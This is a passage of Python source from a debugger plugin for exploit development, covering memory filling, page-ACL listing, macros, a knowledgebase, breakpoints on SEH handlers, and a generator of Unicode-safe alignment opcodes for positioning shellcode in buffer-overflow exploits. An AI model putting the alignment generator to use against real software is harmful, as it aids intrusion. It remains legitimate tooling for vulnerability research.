								refreg = refregtmpparts[0]
								if not refreg in allregs:
									dbg.log("** Please provide a valid reference using -r reg/reference **")
									return
							else:
								dbg.log("** Please provide a valid reference using -r reg/reference **")
								return																
						else:
							# only deref
							refreg = refregtmp
							deref = True
					else:
						# no deref, maybe offset
						if reference.find("+") > -1 or reference.find("-") > -1:
							# deref with offset
							refregtmpparts = []
							refregtmp = reference.replace(" ","")
							if reference.find("+") > -1:
								refregtmpparts = refregtmp.split("+")
								signstuff = 1
							if reference.find("-") > -1:
								refregtmpparts = refregtmp.split("-")
								signstuff = -1
							if len(refregtmpparts) > 1:
								offset = int(refregtmpparts[1].replace("0X",""),16) * signstuff
								refreg = refregtmpparts[0]
								if not refreg in allregs:
									dbg.log("** Please provide a valid reference using -r reg/reference **")
									return
							else:
								dbg.log("** Please provide a valid reference using -r reg/reference **")
								return																
						else:
							# only deref
							refregtmp = reference.replace(" ","")
							refreg = refregtmp
							deref = False
				else:
					dbg.log("** Please provide a valid reference using -r reg/reference **")
					return
			else:
				dbg.log("** Please provide a valid reference using -r reg/reference **")
				return

			if not refreg in allregs:
				dbg.log("** Please provide a valid reference using -r reg/reference **")
				return				

			dbg.log("Ref : %s" % refreg)
			dbg.log("Offset : %d (0x%s)" % (offset,toHex(int(str(offset).replace("-","")))))
			dbg.log("Deref ? : %s" % deref)

			if "b" in args:
				if type(args["b"]).__name__.lower() != "bool":
					if args["b"].find("\\x") > -1:
						fillchar = hex2bin(args["b"])[0]
					else:
						fillchar = args["b"][0]

			# see if we can read the reference
			refvalue = 0
			if deref:
				refref = 0
				try:
					refref = allregs[refreg]+offset
				except:
					dbg.log("** Unable to read from %s (0x%08x)" % (origreference,allregs[refreg]+offset))
				try:
					refvalue = struct.unpack('<L',dbg.readMemory(refref,4))[0]
				except:
					dbg.log("** Unable to read from %s (0x%08x) -> 0x%08x" % (origreference,allregs[reference]+offset,refref))
					return
			else:
				try:
					refvalue = allregs[refreg]+offset
				except:
					dbg.log("** Unable to read from %s (0x%08x)" % (reference,allregs[refreg]+offset))

			dbg.log("Reference : %s: 0x%08x" % (origreference,refvalue))
			dbg.log("Fill char : \\x%s" % bin2hex(fillchar))

			cmd2run = "!heap -p -a 0x%08x" % refvalue
			output = dbg.nativeCommand(cmd2run)
			outputlines = output.split("\n")
			heapinfo = ""
			for line in outputlines:
				if line.find("[") > -1 and line.find("]") > -1 and line.find("(") > -1 and line.find(")") > -1:
					heapinfo = line
					break
			if heapinfo == "":
				dbg.log("Address is not part of a heap chunk")
				if customsize > 0:
					dbg.log("Filling memory location starting at 0x%08x with \\x%s" % (refvalue,bin2hex(fillchar)))
					dbg.log("Number of bytes to write : %d (0x%08x)" % (customsize,customsize))
					data = fillchar * customsize
					dbg.writeMemory(refvalue,data)
					dbg.log("Done")
				else:
					dbg.log("Please specify a custom size with -s to fill up the memory location anyway")
			else:
				infofields = []
				cnt = 0
				charseen = False
				thisfield = ""
				while cnt < len(heapinfo):
					if heapinfo[cnt] == " " and charseen and thisfield != "":
						infofields.append(thisfield)
						thisfield = ""
					else:
						if not heapinfo[cnt] == " ":
							thisfield += heapinfo[cnt]
							charseen = True
					cnt += 1
				if thisfield != "":
					infofields.append(thisfield)
				if len(infofields) > 7:
					chunkptr = hexStrToInt(infofields[0]) 
					userptr = hexStrToInt(infofields[4])
					size = hexStrToInt(infofields[5])
					dbg.log("Heap chunk found at 0x%08x, size 0x%08x (%d) bytes" % (chunkptr,size,size))
					dbg.log("Filling chunk with \\x%s, starting at 0x%08x" % (bin2hex(fillchar),userptr))
					data = fillchar * size
					dbg.writeMemory(userptr,data)
					dbg.log("Done")
			return

		
		def procPageACL(sefl):
			global silent
			silent = True
			allpages = dbg.getMemoryPages()
			dbg.log("%d pages : "% len(allpages))
			orderedpages = []
			for tpage in allpages.keys():
				orderedpages.append(tpage)
			orderedpages.sort()
			dbg.log("Start        End        Size         ACL")
			for thispage in orderedpages:
				page = allpages[thispage]
				pagestart = page.getBaseAddress()
				pagesize = page.getSize()
				ptr = MnPointer(pagestart)
				mod = ""
				sectionname = ""
				try:
					mod = ptr.belongsTo()
					if not mod == "":
						sectionname = page.getSection()
				except:
					mod = ""
				if not mod == "":
					mod = "(" + mod + ")"
				acl = page.getAccess(human=True)
				dbg.log("0x%08x - 0x%08x (0x%08x) %s %s %s" % (pagestart,pagestart + pagesize,pagesize,acl,mod, sectionname))
			silent = False
			return

		def procMacro(args):
			validcommands = ["run","set","list","del","add","show"]
			validcommandfound = False
			selectedcommand = ""
			for command in validcommands:
				if command in args:
					validcommandfound = True
					selectedcommand = command
					break
			dbg.log("")
			if not validcommandfound:
				dbg.log("*** Please specify a valid command. Valid commands are :")
				for command in validcommands:
					dbg.log("    -%s" % command)
				return			

			macroname = ""
			if "set" in args:
				if type(args["set"]).__name__.lower() != "bool":
					macroname = args["set"]

			if "show" in args:
				if type(args["show"]).__name__.lower() != "bool":
					macroname = args["show"]

			if "add" in args:
				if type(args["add"]).__name__.lower() != "bool":
					macroname = args["add"]				

			if "del" in args:
				if type(args["del"]).__name__.lower() != "bool":
					macroname = args["del"]	

			if "run" in args:
				if type(args["run"]).__name__.lower() != "bool":
					macroname = args["run"]	

			filename = ""
			index = -1
			insert = False
			iamsure = False
			if "index" in args:
				if type(args["index"]).__name__.lower() != "bool":
					index = int(args["index"])
					if index < 0:
						dbg.log("** Please use a positive integer as index",highlight=1)

			if "file" in args:
				if type(args["file"]).__name__.lower() != "bool":
					filename = args["file"]

			if filename != "" and index > -1:
				dbg.log("** Please either provide an index or a filename, not both",highlight=1)
				return

			if "insert" in args:
				insert = True

			if "iamsure" in args:
				iamsure = True

			argcommand = ""
			if "cmd" in args:
				if type(args["cmd"]).__name__.lower() != "bool":
					argcommand = args["cmd"]


			dbg.setKBDB("monamacro.db")
			macros = dbg.getKnowledge("macro")
			if macros is None:
				macros = {}

			if selectedcommand == "list":
				for macro in macros:
					thismacro = macros[macro]
					macronametxt = "Macro : '%s' : %d command(s)" % (macro,len(thismacro))
					dbg.log(macronametxt)
				dbg.log("")
				dbg.log("Number of macros : %d" % len(macros))

			if selectedcommand == "show":
				if macroname != "":
					if not macroname in macros:
						dbg.log("** Macro %s does not exist !" % macroname)
						return
					else:
						macro = macros[macroname]
						macronametxt = "Macro : %s" % macroname
						macroline = "-" * len(macronametxt)
						dbg.log(macronametxt)
						dbg.log(macroline)
						thismacro = macro
						macrolist = []
						for macroid in thismacro:
							macrolist.append(macroid)
						macrolist.sort()
						nr_of_commands = 0
						for macroid in macrolist:
							macrocmd = thismacro[macroid]
							if macrocmd.startswith("#"):
								dbg.log("   [%04d] File:%s" % (macroid,macrocmd[1:]))
							else:
								dbg.log("   [%04d] %s" % (macroid,macrocmd))
							nr_of_commands += 1
						dbg.log("")
						dbg.log("Nr of commands in this macro : %d" % nr_of_commands)
				else:
					dbg.log("** Please specify the macroname to show !",highlight=1)
					return					

			if selectedcommand == "run":
				if macroname != "":
					if not macroname in macros:
						dbg.log("** Macro %s does not exist !" % macroname)
						return
					else:
						macro = macros[macroname]
						macronametxt = "Running macro : %s" % macroname
						macroline = "-" * len(macronametxt)
						dbg.log(macronametxt)
						dbg.log(macroline)
						thismacro = macro
						macrolist = []
						for macroid in thismacro:
							macrolist.append(macroid)
						macrolist.sort()
						for macroid in macrolist:
							macrocmd = thismacro[macroid]
							if macrocmd.startswith("#"):
								dbg.log("Executing script %s" % macrocmd[1:])
								output = dbg.nativeCommand("$<%s" % macrocmd[1:])
								dbg.logLines(output)
								dbg.log("-" * 40)
							else:
								dbg.log("Index %d : %s" % (macroid,macrocmd))
								dbg.log("")
								output = dbg.nativeCommand(macrocmd)
								dbg.logLines(output)
								dbg.log("-" * 40)
						dbg.log("")
						dbg.log("[+] Done.")
				else:
					dbg.log("** Please specify the macroname to run !",highlight=1)
					return	

			if selectedcommand == "set":
				if macroname != "":
					if not macroname in macros:
						dbg.log("** Macro %s does not exist !" % macroname)
						return
					if argcommand == "" and filename == "":
						dbg.log("** Please enter a valid command with parameter -cmd",highlight=1)
						return
					thismacro = macros[macroname]
					if index == -1:
						for i in thismacro:
							thiscmd = thismacro[i]
							if thiscmd.startswith("#"):
								dbg.log("** You cannot edit a macro that uses a scriptfile.",highlight=1)
								dbg.log("   Edit file %s instead" % thiscmd[1:],highlight=1)
								return						
						if filename == "":
							# append to end of the list
							# find the next index first
							nextindex = 0
							for macindex in thismacro:
								if macindex >= nextindex:
									nextindex = macindex+1
							if thismacro.__class__.__name__ == "dict":
								thismacro[nextindex] = argcommand
							else:
								thismacro = {}
								thismacro[nextindex] = argcommand
						else:
							thismacro = {}
							nextindex = 0
							thismacro[0] = "#%s" % filename
						macros[macroname] = thismacro
						dbg.addKnowledge("macro",macros)
						dbg.log("[+] Done, saved new command at index %d." % nextindex)
					else:
						# user has specified an index
						if index in thismacro:
							if argcommand == "#":
								# remove command at this index
								del thismacro[index]
							else:
								# if macro already contains a file entry, bail out
								for i in thismacro:
									thiscmd = thismacro[i]
									if thiscmd.startswith("#"):
										dbg.log("** You cannot edit a macro that uses a scriptfile.",highlight=1)
										dbg.log("   Edit file %s instead" % thiscmd[1:],highlight=1)
										return
								# index exists - overwrite unless -insert was provided too
								# remove or insert ?
								#print sys.argv
								if not insert:
									thismacro[index] = argcommand
								else:
									# move things around
									# get ordered list of existing indexes
									indexes = []
									for macindex in thismacro:
										indexes.append(macindex)
									indexes.sort()
									thismacro2 = {}
									cmdadded = False
									for i in indexes:
										if i < index:
											thismacro2[i] = thismacro[i]
										elif i == index:
											thismacro2[i] = argcommand
											thismacro2[i+1] = thismacro[i]
										elif i > index:
											thismacro2[i+1] = thismacro[i]
									thismacro = thismacro2
						else:
							# index does not exist, add new command to this index
							for i in thismacro:
								thiscmd = thismacro[i]
								if thiscmd.startswith("#"):
									dbg.log("** You cannot edit a macro that uses a scriptfile.",highlight=1)
									dbg.log("   Edit file %s instead" % thiscmd[1:],highlight=1)
									return							
							if argcommand != "#":
								thismacro[index] = argcommand
							else:
								dbg.log("** Index %d does not exist, unable to remove the command at that position" % index,highlight=1)
						macros[macroname] = thismacro
						dbg.addKnowledge("macro",macros)
						if argcommand != "#":
							dbg.log("[+] Done, saved new command at index %d." % index)
						else:
							dbg.log("[+] Done, removed command at index %d." % index)
				else:
					dbg.log("** Please specify the macroname to edit !",highlight=1)
					return

			if selectedcommand == "add":
				if macroname != "":
					if macroname in macros:
						dbg.log("** Macro '%s' already exists !" % macroname,highlight=1)
						return
					else:
						macros[macroname] = {}
						dbg.log("[+] Adding macro '%s'" % macroname)
						dbg.addKnowledge("macro",macros)
						dbg.log("[+] Done.")
				else:
					dbg.log("** Please specify the macroname to add !",highlight=1)
					return


			if selectedcommand == "del":
				if not macroname in macros:
					dbg.log("** Macro '%s' doesn't exist !" % macroname,highlight=1)
				else:
					if not iamsure:
						dbg.log("** To delete macro '%s', please add the -iamsure flag to the command" % macroname)
						return
					else:
						dbg.forgetKnowledge("macro",macroname)
						dbg.log("[+] Done, deleted macro '%s'" % macroname)
			return


		def procKb(args):
			validcommands = ['set','list','del']
			validcommandfound = False
			selectedcommand = ""
			selectedid = ""
			selectedvalue = ""
			for command in validcommands:
				if command in args:
					validcommandfound = True
					selectedcommand = command
					break
			dbg.log("")
			if not validcommandfound:
				dbg.log("*** Please specify a valid command. Valid commands are :")
				for command in validcommands:
					dbg.log("    -%s" % command)
				return

			if "id" in args:
				if type(args["id"]).__name__.lower() != "bool":
					selectedid = args["id"]

			if "value" in args:
				if type(args["value"]).__name__.lower() != "bool":
					selectedvalue = args["value"]

			dbg.log("Knowledgebase database : %s" % dbg.getKBDB())
			kb = dbg.listKnowledge()
			if selectedcommand == "list":
				dbg.log("Number of IDs in Knowledgebase : %d" % len(kb))
				if len(kb) > 0:
					if selectedid == "":
						dbg.log("IDs :")
						dbg.log("-----")
						for kbid in kb:
							dbg.log(kbid)
					else:
						if selectedid in kb:
							kbid = dbg.getKnowledge(selectedid)
							kbtype = kbid.__class__.__name__
							kbtitle = "Entries for ID %s (type %s) :" % (selectedid,kbtype)
							dbg.log(kbtitle)
							dbg.log("-" * (len(kbtitle)+2))
							if selectedvalue != "":
								dbg.log("  (Filter : %s)" % selectedvalue)
							nrentries = 0
							if kbtype == "dict":
								for dictkey in kbid:
									if selectedvalue == "" or selectedvalue in dictkey:
										logline = ""
										if kbid[dictkey].__class__.__name__ == "int" or kb[dictkey].__class__.__name__ == "long":
											logline = "  %s : %d (0x%x)" % (str(dictkey),kbid[dictkey],kbid[dictkey])
										else:
											logline = "  %s : %s" % (str(dictkey),kbid[dictkey])
										dbg.log(logline)
										nrentries += 1
							if kbtype == "list":
								cnt = 0
								for entry in kbid:
									dbg.log("  %d : %s" % (cnt,kbid[entry]))
									cnt += 1
									nrentries += 1
							if kbtype == "str":
								dbg.log("  %s" % kbid)
								nrentries += 1
							if kbtype == "int" or kbtype == "long":
								dbg.log("  %d (0x%08x)" % (kbid,kbid))
								nrentries += 1

							dbg.log("")
							filtertxt = ""
							if selectedvalue != "":
								filtertxt="filtered "
							dbg.log("Number of %sentries for ID %s : %d" % (filtertxt,selectedid,nrentries))
						else:
							dbg.log("ID %s was not found in the Knowledgebase" % selectedid)

			if selectedcommand == "set":
				# we need an ID and a value argument
				if selectedid == "":
					dbg.log("*** Please enter a valid ID with -id",highlight=1)
					return
				if selectedvalue == "":
					dbg.log("*** Please enter a valid value",highlight=1)
					return
				if selectedid in kb:
					# vtableCache
					if selectedid == "vtableCache":
						# split on command
						valueparts = selectedvalue.split(",")
						if len(valueparts) == 2:
							vtablename = valueparts[0].strip(" ")
							vtablevalue = 0
							if "0x" in valueparts[1].lower():
								vtablevalue = int(valueparts[1],16)
							else:
								vtablevalue = int(valueparts[1])
							kbadd = {}
							kbadd[vtablename] = vtablevalue
							dbg.addKnowledge(selectedid,kbadd)
						else:
							dbg.log("*** Please provide a valid value for -value")
							dbg.log("*** KB %s contains a list, please use a comma")
							dbg.log("*** to separate entries. First entry should be a string,")
							dbg.log("*** Second entry should be an integer.")
							return
					else:
						dbg.addKnowledge(selectedid,selectedvalue)
					dbg.log(" ")
					dbg.log("ID %s updated." % selectedid)
				else:
					dbg.log("ID %s was not found in the Knowledgebase" % selectedid)

			if selectedcommand == "del":
				if selectedid == "" or selectedid not in kb:
					dbg.log("*** Please enter a valid ID with -id",highlight=1)
					return
				else:
					dbg.forgetKnowledge(selectedid,selectedvalue)
				if selectedvalue == "":
					dbg.log("*** Entire ID %s removed from Knowledgebase" % selectedid)
				else:
					dbg.log("*** Object %s in ID %s removed from Knowledgebase" % (selectedvalue,selectedid))
			return

		def procBPSeh(self):
			sehchain = dbg.getSehChain()
			dbg.log("Nr of SEH records : %d" % len(sehchain))
			if len(sehchain) > 0:
				dbg.log("SEH Chain :")
				dbg.log("-----------")
				dbg.log("Address     Next SEH    Handler")
				for sehrecord in sehchain:
					address = sehrecord[0]
					sehandler = sehrecord[1]
					nseh = ""
					try:
						nsehvalue = struct.unpack('<L',dbg.readMemory(address,4))[0]
						nseh = "0x%08x" % nsehvalue
					except:
						nseh = "0x??????????"
					bpsuccess = True
					try:
						if __DEBUGGERAPP__ == "WinDBG":
							bpsuccess = dbg.setBreakpoint(sehandler)
						else:
							dbg.setBreakpoint(sehandler)
							bpsuccess = True
					except:
						bpsuccess = False
					bptext = ""
					if not bpsuccess:
						bptext = "BP failed"
					else:
						bptext = "BP set"
					ptr = MnPointer(sehandler)
					funcinfo = ptr.getPtrFunction()
					dbg.log("0x%08x  %s  0x%08x %s <- %s" % (address,nseh,sehandler,funcinfo,bptext))
			dbg.log("")
			return "Done"

		def procAlignment(args):
                        #automatic generation of code alignment code by floyd, http://www.floyd.ch, twitter: @floyd_ch
			leaks = False
			address = 0
			bufferRegister = "eax" #we will put ebp into the buffer register
			timeToRun = 15
			registers = {"eax":0, "ebx":0, "ecx":0, "edx":0, "esp":0, "ebp":0,}
			showerror = False
			if "?" in args and args["?"] != "":
				try:
					address = int(args["?"],16)
				except:
					address = 0
			if address == 0:
				dbg.log("Please enter a valid address",highlight=1)
				dbg.log("This means the address of where our code alignment code will start")
				dbg.log("(without leaking zero byte). Don't worry, the script will only use")
				dbg.log("it to calculate the offset from the address to EBP.")
				showerror=True
			if "l" in args:
				leaks = True
			if "b" in args:
                                if args["b"].lower().strip() == "eax":
                                        bufferRegister = 'eax'
                                elif args["b"].lower().strip() == "ebx":
                                        bufferRegister = 'ebx'
                                elif args["b"].lower().strip() == "ecx":
                                        bufferRegister = 'ecx'
                                elif args["b"].lower().strip() == "edx":
                                        bufferRegister = 'edx'
                                else:
                                        showerror = True
			if "t" in args and args["t"] != "":
                                try:
                                        timeToRun = int(args["t"])
                                except:
                                        dbg.log("Please enter a valid integer for -t",highlight=1)
                                        showerror=True
			if "ebp" in args and args["ebp"] != "":
                                try:
                                        registers["ebp"] = int(args["ebp"],16)
                                except:
                                        dbg.log("Please enter a valid value for ebp",highlight=1)
                                        showerror=True
                        if showerror:
				dbg.log("Usage :")
				dbg.logLines(alignmentUsage, highlight=1)
				return
			else:
                                prepareAlignment(leaks, address, bufferRegister, timeToRun, registers)
			
		def prepareAlignment(leaks, address, bufferRegister, timeToRun, registers):
                        #automatic generation of code alignment code by floyd, http://www.floyd.ch, twitter: @floyd_ch
                        def getRegister(registerName):
                                registerName = registerName.upper()
                                regs = dbg.getRegs()
                                if registerName in regs:
					return regs[registerName]
                        def calculateNewXregister(x,h,l):
                                return ((x>>16)<<16)+(h<<8)+l
			prefix = ""
			postfix = ""
			additionalLength = 0 #Length of the prefix+postfix instructions in after-unicode-conversion bytes
			code_to_get_rid_of_zeros = "add [ebp],ch; " #\x6d --> \x00\x6d\x00

                        buf_sig = bufferRegister[1]
			
			registers_to_fill = ["ah", "al", "bh", "bl", "ch", "cl", "dh", "dl"] #important: h's first!
			registers_to_fill.remove(buf_sig+"h")
			registers_to_fill.remove(buf_sig+"l")
			
			leadingZero = leaks

                        for name in registers:
                                if not registers[name]:
                                        registers[name] = getRegister(name)

                        #256 values with only 8276 instructions (bruteforced), best found so far:
			#values_to_generate_all_255_values = [71, 87, 15, 251, 162, 185]
                        #but to be on the safe side, let's take only A-Za-z values (in 8669 instructions):
                        values_to_generate_all_255_values = [86, 85, 75, 109, 121, 99]
                        
			new_values = zip(registers_to_fill, values_to_generate_all_255_values)
			
                        if leadingZero:
                                prefix += code_to_get_rid_of_zeros
                                additionalLength += 2
                                leadingZero = False
			#prefix += "mov bl,0; mov bh,0; mov cl,0; mov ch,0; mov dl,0; mov dh,0; "
			#additionalLength += 12
			for name, value in zip(registers_to_fill, values_to_generate_all_255_values):
                                padding = ""
                                if value < 16:
                                        padding = "0"
                                if "h" in name:
                                        prefix += "mov e%sx,0x4100%s%s00; " % (name[0], padding, hex(value)[2:])
                                        prefix += "add [ebp],ch; "
                                        additionalLength += 8
                                if "l" in name:
                                        prefix += "mov e%sx,0x4100%s%s00; " % (buf_sig, padding, hex(value)[2:])
                                        prefix += "add %s,%sh; " % (name, buf_sig)
                                        prefix += "add [ebp],ch; "
                                        additionalLength += 10
                        leadingZero = False
                        new_values_dict = dict(new_values)
                        for new in registers_to_fill[::2]:
                                n = new[0]
                                registers['e%sx'%n] = calculateNewXregister(registers['e%sx'%n], new_values_dict['%sh'%n], new_values_dict['%sl'%n])
                        #!mona alignment 0x02CDFD44 -b eax -t 10 -ebp 0x02cde9d4
			
                        if leadingZero:
                                prefix += code_to_get_rid_of_zeros
                                additionalLength += 2
                                leadingZero = False
                        #Let's push the value of ebp into the BufferRegister
                        prefix += "push ebp; %spop %s; " % (code_to_get_rid_of_zeros, bufferRegister)
                        leadingZero = True
                        additionalLength += 6
                        registers[bufferRegister] = registers["ebp"]

                        if not leadingZero:
                                #We need a leading zero for the ADD operations
                                prefix += "push ebp; " #something 1 byte, doesn't matter what
                                leadingZero = True
                                additionalLength += 2
                                                
			#The last ADD command will leak another zero to the next instruction
			#Therefore append (postfix) a last instruction to get rid of it
                        #so the shellcode is nicely aligned                                
			postfix += code_to_get_rid_of_zeros
			additionalLength += 2
			
			generateAlignment(address, bufferRegister, registers, timeToRun, prefix, postfix, additionalLength)

		def generateAlignment(alignment_code_loc, bufferRegister, registers, timeToRun, prefix, postfix, additionalLength):
                        import copy, random, time #automatic generation of code alignment code by floyd, http://www.floyd.ch, twitter: @floyd_ch
			def sanitiseZeros(originals, names):
				for index, i in enumerate(originals):
					if i == 0:
						warn("Your %s register is zero. That's bad for the heuristic." % names[index])
                                                warn("In general this means there will be no result or they consist of more bytes.")

			def checkDuplicates(originals, names):
				duplicates = len(originals) - len(set(originals))
				if duplicates > 0:
					warn("""Some of the 2 byte registers seem to be the same. There is/are %i duplicate(s):""" % duplicates)
					warn("In general this means there will be no result or they consist of more bytes.")
					warn(", ".join(names))
					warn(", ".join(hexlist(originals)))

			def checkHigherByteBufferRegisterForOverflow(g1, name, g2):
				overflowDanger = 0x100-g1
				max_instructions = overflowDanger*256-g2
				if overflowDanger <= 3:
					warn("Your BufferRegister's %s register value starts pretty high (%s) and might overflow." % (name, hex(g1)))
					warn("Therefore we only look for solutions with less than %i bytes (%s%s until overflow)." % (max_instructions, hex(g1), hex(g2)[2:]))
					warn("This makes our search space smaller, meaning it's harder to find a solution.")
				return max_instructions

			def randomise(values, maxValues):
				for index, i in enumerate(values):
					if random.random() <= MAGIC_PROBABILITY_OF_ADDING_AN_ELEMENT_FROM_INPUTS:
						values[index] += 1 
						values[index] = values[index] % maxValues[index]

			def check(as1, index_for_higher_byte, ss, gs, xs, ys, M, best_result):
				g1, g2 = gs
				s1, s2 = ss
				sum_of_instructions = 2*sum(xs) + 2*sum(ys) + M
				if best_result > sum_of_instructions:
					res0 = s1
					res1 = s2
					for index, _ in enumerate(as1):
						res0 += as1[index]*xs[index] % 256
					res0 = res0 - ((g2+sum_of_instructions)/256)
					as2 = copy.copy(as1)
					as2[index_for_higher_byte] = (g1 + ((g2+sum_of_instructions)/256)) % 256
					for index, _ in enumerate(as2):
						res1 += as2[index]*ys[index] % 256
					res1 = res1 - sum_of_instructions
					if g1 == res0 % 256 and g2 == res1 % 256:
                                                return sum_of_instructions
				return 0
			
			def printNicely(names, buffer_registers_4_byte_names, xs, ys, additionalLength=0, prefix="", postfix=""):
                                resulting_string = prefix
                                sum_bytes = 0
                                for index, x in enumerate(xs):
                                        for k in range(0, x):
                                                resulting_string += "add "+buffer_registers_4_byte_names[0]+","+names[index]+"; "
                                                sum_bytes += 2
                                for index, y in enumerate(ys):
                                        for k in range(y):
                                                resulting_string += "add "+buffer_registers_4_byte_names[1]+","+names[index]+"; "
                                                sum_bytes += 2
                                resulting_string += postfix
                                sum_bytes += additionalLength
				info("[+] %i resulting bytes (%i bytes injection) of Unicode code alignment. Instructions:"%(sum_bytes,sum_bytes/2))
                                info("   ", resulting_string)
                                hex_string = metasm(resulting_string)
                                info("    Unicode safe opcodes without zero bytes:")
                                info("   ", hex_string)

                        def metasm(inputInstr):
                                #the immunity and metasm assembly differ a lot:
                                #immunity add [ebp],ch "\x00\xad\x00\x00\x00\x00"
                                #metasm add [ebp],ch "\x00\x6d\x00" --> we want this!
                                #Therefore implementing our own "metasm" mapping here
                                #same problem for things like mov eax,0x41004300                             
                                ass_operation = {'add [ebp],ch': '\\x00\x6d\\x00', 'pop ebp': ']', 'pop edx': 'Z', 'pop ecx': 'Y', 'push ecx': 'Q',
                                                 'pop ebx': '[', 'push ebx': 'S', 'pop eax': 'X', 'push eax': 'P', 'push esp': 'T', 'push ebp': 'U',
                                                 'push edx': 'R', 'pop esp': '\\', 'add dl,bh': '\\x00\\xfa', 'add dl,dh': '\\x00\\xf2',
                                                 'add dl,ah': '\\x00\\xe2', 'add ah,al': '\\x00\\xc4', 'add ah,ah': '\\x00\\xe4', 'add ch,bl': '\\x00\\xdd',
                                                 'add ah,cl': '\\x00\\xcc', 'add bl,ah': '\\x00\\xe3', 'add bh,dh': '\\x00\\xf7', 'add bl,cl': '\\x00\\xcb',
                                                 'add ah,ch': '\\x00\\xec', 'add bl,al': '\\x00\\xc3', 'add bh,dl': '\\x00\\xd7', 'add bl,ch': '\\x00\\xeb',
                                                 'add dl,cl': '\\x00\\xca', 'add dl,bl': '\\x00\\xda', 'add al,ah': '\\x00\\xe0', 'add bh,ch': '\\x00\\xef',
                                                 'add al,al': '\\x00\\xc0', 'add bh,cl': '\\x00\\xcf', 'add al,ch': '\\x00\\xe8', 'add dh,bl': '\\x00\\xde',
                                                 'add ch,ch': '\\x00\\xed', 'add cl,dl': '\\x00\\xd1', 'add al,cl': '\\x00\\xc8', 'add dh,bh': '\\x00\\xfe',
                                                 'add ch,cl': '\\x00\\xcd', 'add cl,dh': '\\x00\\xf1', 'add ch,ah': '\\x00\\xe5', 'add cl,bl': '\\x00\\xd9',
                                                 'add dh,al': '\\x00\\xc6', 'add ch,al': '\\x00\\xc5', 'add cl,bh': '\\x00\\xf9', 'add dh,ah': '\\x00\\xe6',
                                                 'add dl,dl': '\\x00\\xd2', 'add dh,cl': '\\x00\\xce', 'add dh,dl': '\\x00\\xd6', 'add ah,dh': '\\x00\\xf4',
                                                 'add dh,dh': '\\x00\\xf6', 'add ah,dl': '\\x00\\xd4', 'add ah,bh': '\\x00\\xfc', 'add ah,bl': '\\x00\\xdc',
                                                 'add bl,bh': '\\x00\\xfb', 'add bh,al': '\\x00\\xc7', 'add bl,dl': '\\x00\\xd3', 'add bl,bl': '\\x00\\xdb',
                                                 'add bh,ah': '\\x00\\xe7', 'add bl,dh': '\\x00\\xf3', 'add bh,bl': '\\x00\\xdf', 'add al,bl': '\\x00\\xd8',
                                                 'add bh,bh': '\\x00\\xff', 'add al,bh': '\\x00\\xf8', 'add al,dl': '\\x00\\xd0', 'add dl,ch': '\\x00\\xea',
                                                 'add dl,al': '\\x00\\xc2', 'add al,dh': '\\x00\\xf0', 'add cl,cl': '\\x00\\xc9', 'add cl,ch': '\\x00\\xe9',
                                                 'add ch,bh': '\\x00\\xfd', 'add cl,al': '\\x00\\xc1', 'add ch,dh': '\\x00\\xf5', 'add cl,ah': '\\x00\\xe1',
                                                 'add dh,ch': '\\x00\\xee', 'add ch,dl': '\\x00\\xd5', 'add ch,ah': '\\x00\\xe5', 'mov dh,0': '\\xb6\\x00',
                                                 'add dl,ah': '\\x00\\xe2', 'mov dl,0': '\\xb2\\x00', 'mov ch,0': '\\xb5\\x00', 'mov cl,0': '\\xb1\\x00',
                                                 'mov bh,0': '\\xb7\\x00', 'add bl,ah': '\\x00\\xe3', 'mov bl,0': '\\xb3\\x00', 'add dh,ah': '\\x00\\xe6',
                                                 'add cl,ah': '\\x00\\xe1', 'add bh,ah': '\\x00\\xe7'}
				for example_instr, example_op in [("mov eax,0x41004300", "\\xb8\\x00\\x43\\x00\\x41"),
                                                                  ("mov ebx,0x4100af00", "\\xbb\\x00\\xaf\\x00\\x41"),
                                                                  ("mov ecx,0x41004300", "\\xb9\\x00\\x43\\x00\\x41"),
                                                                  ("mov edx,0x41004300", "\\xba\\x00\\x43\\x00\\x41")]:
                                        for i in range(0,256):
                                                padding =""
                                                if i < 16:
                                                        padding = "0"
                                                new_instr = example_instr[:14]+padding+hex(i)[2:]+example_instr[16:]
                                                new_op = example_op[:10]+padding+hex(i)[2:]+example_op[12:]
                                                ass_operation[new_instr] = new_op
                                res = ""
				for instr in inputInstr.split("; "):
                                        if instr in ass_operation:
						res += ass_operation[instr].replace("\\x00","")
					elif instr.strip():
                                                warn("    Couldn't find metasm assembly for %s" % str(instr))
                                                warn("    You have to manually convert it in the metasm shell")
                                                res += "<"+instr+">"
                                return res
				
                        def getCyclic(originals):
                                cyclic = [0 for i in range(0,len(originals))]
                                for index, orig_num in enumerate(originals):
                                        cycle = 1
                                        num = orig_num
                                        while True:
                                                cycle += 1
                                                num += orig_num
                                                num = num % 256
                                                if num == orig_num:
                                                        cyclic[index] = cycle
                                                        break
                                return cyclic

                        def hexlist(lis):
                                return [hex(i) for i in lis]
                                
                        def theX(num):
                                res = (num>>16)<<16 ^ num
                                return res
                                
                        def higher(num):
                                res = num>>8
                                return res
                                
                        def lower(num):
                                res = ((num>>8)<<8) ^ num
                                return res
                                
                        def info(*text):
                                dbg.log(" ".join(str(i) for i in text))
                                
                        def warn(*text):
                                dbg.log(" ".join(str(i) for i in text), highlight=1)
                                
                        def debug(*text):
                                if False:
                                        dbg.log(" ".join(str(i) for i in text))
			buffer_registers_4_byte_names = [bufferRegister[1]+"h", bufferRegister[1]+"l"]
			buffer_registers_4_byte_value = theX(registers[bufferRegister])
			
			MAGIC_PROBABILITY_OF_ADDING_AN_ELEMENT_FROM_INPUTS=0.25
			MAGIC_PROBABILITY_OF_RESETTING=0.04
			MAGIC_MAX_PROBABILITY_OF_RESETTING=0.11

			originals = []
			ax = theX(registers["eax"])
			ah = higher(ax)
			al = lower(ax)
				
			bx = theX(registers["ebx"])
			bh = higher(bx)
			bl = lower(bx)
			
			cx = theX(registers["ecx"])
			ch = higher(cx)
			cl = lower(cx)
			
			dx = theX(registers["edx"])
			dh = higher(dx)
			dl = lower(dx)
			
			start_address = theX(buffer_registers_4_byte_value)
			s1 = higher(start_address)
			s2 = lower(start_address)
			
			alignment_code_loc_address = theX(alignment_code_loc)
			g1 = higher(alignment_code_loc_address)
			g2 = lower(alignment_code_loc_address)
			
			names = ['ah', 'al', 'bh', 'bl', 'ch', 'cl', 'dh', 'dl']
			originals = [ah, al, bh, bl, ch, cl, dh, dl]
			sanitiseZeros(originals, names)
			checkDuplicates(originals, names)
			best_result = checkHigherByteBufferRegisterForOverflow(g1, buffer_registers_4_byte_names[0], g2)
						
			xs = [0 for i in range(0,len(originals))]
